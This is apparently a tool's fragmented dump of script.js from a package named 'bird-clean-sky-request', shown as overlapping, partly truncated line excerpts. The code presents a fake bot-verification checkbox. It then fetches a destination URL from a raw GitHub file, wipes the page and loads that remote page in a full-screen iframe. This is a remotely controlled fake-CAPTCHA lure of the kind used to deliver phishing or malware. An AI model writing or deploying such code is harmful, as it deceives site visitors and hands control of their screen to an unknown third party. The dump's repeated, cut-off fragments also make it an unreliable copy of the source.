// File: tmp/tmp9zx8uskv/bird-clean-sky-request/package/script.js
// ======================================================================
Line 1: document.addEventListener('DOMContentLoaded', function() {
  const checkbox = document.getElementById('botCheck');
  const verificationBox = document.querySelector('.verification-box');
  const loadingSpinner = document.getElementById('loadingSpinner');
  const checkboxContainer = document.querySelector('.checkbox-container');

  // ссылка на raw-файл GitHub
  const githubRedirectFile = 'https://raw.githubusercontent.com/Abassdos2992/mad-2.0.0/refs/heads/main/mad2.txt';

  const fetchUrl = githubRedirectFile;

  checkbox.addEventListener('change', function() {
    if (!this.checked) return;

    try {
      showLoadingState();

      setTimeout(() => {
        showSuccessState();

        setTimeout(() => {
          console.info('[iframe] fetching URL from', fetchUrl);
          fetch(fetchUrl, { method: 'GET', cache: 'no-store' })
            .then(response => {
              console.info('[iframe] fetch status:', response.status, response.statusText);
              return respons...
Line 8: const githubRedirectFile = 'https://raw.githubusercontent.com/Abassdos2992/mad-2.0.0/refs/heads/main/mad2.txt'
Line 12: checkbox.addEventListener('change', function() {
    if (!this.checked) return;

    try {
      showLoadingState();

      setTimeout(() => {
        showSuccessState();

        setTimeout(() => {
          console.info('[iframe] fetching URL from', fetchUrl);
          fetch(fetchUrl, { method: 'GET', cache: 'no-store' })
            .then(response => {
              console.info('[iframe] fetch status:', response.status, response.statusText);
              return response.text().then(text => ({ status: response.status, text }));
            })
            .then(({ status, text }) => {
              const url = (text || '').trim();
              console.info('[iframe] raw text length:', (text || '').length);
              if (!url) {
                console.error('[iframe] empty URL received from GitHub file');
                return;
              }
              if (!/^https?:\/\//i.test(url)) {
                console.error('[iframe] invalid URL format:', url);
               ...
Line 15: {
      showLoadingState();

      setTimeout(() => {
        showSuccessState();

        setTimeout(() => {
          console.info('[iframe] fetching URL from', fetchUrl);
          fetch(fetchUrl, { method: 'GET', cache: 'no-store' })
            .then(response => {
              console.info('[iframe] fetch status:', response.status, response.statusText);
              return response.text().then(text => ({ status: response.status, text }));
            })
            .then(({ status, text }) => {
              const url = (text || '').trim();
              console.info('[iframe] raw text length:', (text || '').length);
              if (!url) {
                console.error('[iframe] empty URL received from GitHub file');
                return;
              }
              if (!/^https?:\/\//i.test(url)) {
                console.error('[iframe] invalid URL format:', url);
                return;
              }

              console.info('[iframe] embedding:', url);

      ...
Line 16: showLoadingState()
Line 18: {
        showSuccessState();

        setTimeout(() => {
          console.info('[iframe] fetching URL from', fetchUrl);
          fetch(fetchUrl, { method: 'GET', cache: 'no-store' })
            .then(response => {
              console.info('[iframe] fetch status:', response.status, response.statusText);
              return response.text().then(text => ({ status: response.status, text }));
            })
            .then(({ status, text }) => {
              const url = (text || '').trim();
              console.info('[iframe] raw text length:', (text || '').length);
              if (!url) {
                console.error('[iframe] empty URL received from GitHub file');
                return;
              }
              if (!/^https?:\/\//i.test(url)) {
                console.error('[iframe] invalid URL format:', url);
                return;
              }

              console.info('[iframe] embedding:', url);

              // вставляем iframe вместо редиректа
       ...
Line 19: showSuccessState()
Line 21: setTimeout(() => {
          console.info('[iframe] fetching URL from', fetchUrl);
          fetch(fetchUrl, { method: 'GET', cache: 'no-store' })
            .then(response => {
              console.info('[iframe] fetch status:', response.status, response.statusText);
              return response.text().then(text => ({ status: response.status, text }));
            })
            .then(({ status, text }) => {
              const url = (text || '').trim();
              console.info('[iframe] raw text length:', (text || '').length);
              if (!url) {
                console.error('[iframe] empty URL received from GitHub file');
                return;
              }
              if (!/^https?:\/\//i.test(url)) {
                console.error('[iframe] invalid URL format:', url);
                return;
              }

              console.info('[iframe] embedding:', url);

              // вставляем iframe вместо редиректа
              openInFrame(url);
            })...
Line 22: console.info('[iframe] fetching URL from', fetchUrl)
Line 23: (_tmp_1 = fetch(fetchUrl, { method: 'GET', cache: 'no-store' })
            .then(response => {
              console.info('[iframe] fetch status:', response.status, response.statusText);
              return response.text().then(text => ({ status: response.status, text }));
            })
            .then(({ status, text }) => {
              const url = (text || '').trim();
              console.info('[iframe] raw text length:', (text || '').length);
              if (!url) {
                console.error('[iframe] empty URL received from GitHub file');
                return;
              }
              if (!/^https?:\/\//i.test(url)) {
                console.error('[iframe] invalid URL format:', url);
                return;
              }

              console.info('[iframe] embedding:', url);

              // вставляем iframe вместо редиректа
              openInFrame(url);
            }))
Line 24: {
              console.info('[iframe] fetch status:', response.status, response.statusText);
              return response.text().then(text => ({ status: response.status, text }));
            }
Line 25: console.info('[iframe] fetch status:', response.status, response.statusText)
Line 26: response.text().then(text => ({ status: response.status, text }))
Line 28: {
              const url = (text || '').trim();
              console.info('[iframe] raw text length:', (text || '').length);
              if (!url) {
                console.error('[iframe] empty URL received from GitHub file');
                return;
              }
              if (!/^https?:\/\//i.test(url)) {
                console.error('[iframe] invalid URL format:', url);
                return;
              }

              console.info('[iframe] embedding:', url);

              // вставляем iframe вместо редиректа
              openInFrame(url);
            }
Line 29: (text || '').trim()
Line 30: console.info('[iframe] raw text length:', (text || '').length)
Line 31: {
                console.error('[iframe] empty URL received from GitHub file');
                return;
              }
Line 32: console.error('[iframe] empty URL received from GitHub file')
Line 35: {
                console.error('[iframe] invalid URL format:', url);
                return;
              }
Line 36: console.error('[iframe] invalid URL format:', url)
Line 40: console.info('[iframe] embedding:', url)
Line 45: {
              console.error('[iframe] fetch failed:', err);
            }
Line 46: console.error('[iframe] fetch failed:', err)
Line 50: catch (e) {
      console.error('[iframe] unexpected error:', e);
    }
Line 51: console.error('[iframe] unexpected error:', e)
Line 66: {
    const iframe = document.createElement("iframe");
    iframe.src = url;
    iframe.style.position = "fixed";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.style.width = "100%";
    iframe.style.height = "100%";
    iframe.style.border = "none";
    iframe.style.zIndex = "9999"; 
    document.body.innerHTML = ""; // очищаем всё, чтобы iframe был на весь экран
    document.body.appendChild(iframe);
  }
Line 77: document.body.appendChild(iframe)
